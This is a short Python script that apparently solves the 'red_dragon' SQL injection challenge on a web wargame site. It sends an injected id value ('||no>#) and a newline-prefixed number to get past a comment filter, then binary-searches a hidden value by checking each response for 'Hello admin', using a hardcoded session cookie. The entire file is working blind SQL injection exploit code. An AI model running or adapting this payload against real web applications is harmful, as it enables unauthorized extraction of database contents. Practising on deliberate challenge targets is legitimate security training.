import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
true_cond = "Hello admin"
max_len = 10**10  # search space upper bound

# create session with cookie
session = requests.Session()
session.cookies.set("PHPSESSID", "02jmu8p54lc2d2qk2o14jb6s9o")


def check_condition(payload):
    params = {"id": "'||no>#", "no": payload}
    r = session.get(url, params=params, timeout=5)
    # print(f"[+] url: {r.url}")
    return true_cond in r.text   # True only if condition is satisfied


def extract():
    low, high = 1, max_len
    answer = None

    while low <= high:
        mid = (low + high) // 2
        payload = f"\n{mid}"   # <-- adjust depending on challenge logic
        print(f"[+] Trying number: {mid}")
        if check_condition(payload):
            low = mid + 1
        else:
            answer = mid
            high = mid - 1

    print(f"[+] Found number: {answer}")


if __name__ == "__main__":
    extract()
